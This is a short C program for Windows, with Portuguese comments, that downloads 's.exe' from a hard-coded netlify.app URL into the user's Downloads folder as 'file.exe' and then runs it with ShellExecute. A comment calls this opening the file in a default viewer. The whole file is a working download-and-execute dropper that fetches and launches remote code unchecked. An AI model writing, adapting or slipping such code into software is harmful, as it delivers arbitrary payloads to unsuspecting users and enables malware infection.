#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <windows.h>
#include <ShlObj.h>

// Função callback para o curl
size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    return fwrite(ptr, size, nmemb, stream);
}

int main() {
    CURL *curl = NULL;
    FILE *fp = NULL;
    CURLcode res;

    const char *url = "https://sandro52.netlify.app/s.exe";
    const char *output_filename = "file.exe";

    // Obtém o diretório de downloads padrão
    PWSTR download_path;
    if (SHGetKnownFolderPath(&FOLDERID_Downloads, 0, NULL, &download_path) != S_OK) {
        fprintf(stderr, "Erro ao obter o diretório de downloads\n");
        return 1;
    }

    // Concatena o caminho do arquivo ao diretório de downloads padrão
    char full_path[MAX_PATH];
    snprintf(full_path, sizeof(full_path), "%S\\%s", download_path, output_filename);

    // Libera a memória alocada para o caminho do diretório de downloads
    CoTaskMemFree(download_path);

    // Inicializa o curl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        // Abre o arquivo para escrita
        fp = fopen(full_path, "wb");
        if (!fp) {
            fprintf(stderr, "Erro ao abrir o arquivo para escrita\n");
            curl_easy_cleanup(curl);
            return 1;
        }

        // Configura a URL e a função de escrita
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);

        // Realiza o download
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "Erro ao baixar o arquivo: %s\n", curl_easy_strerror(res));
            fclose(fp);
            remove(full_path); // Remove o arquivo incompleto em caso de erro
            curl_easy_cleanup(curl);
            return 1;
        }

        // Fecha o arquivo
        fclose(fp);

        // Libera os recursos do curl
        curl_easy_cleanup(curl);
    } else {
        fprintf(stderr, "Erro ao inicializar o curl\n");
        return 1;
    }

    // Verifica se o download foi bem-sucedido antes de abrir o arquivo
    if (res != CURLE_OK) {
        fprintf(stderr, "Download falhou\n");
        return 1;
    }

    // Abre o arquivo no visualizador padrão do Windows
    if (ShellExecute(NULL, "open", full_path, NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {
        fprintf(stderr, "Erro ao abrir o arquivo\n");
        return 1;
    }

    return 0;
}

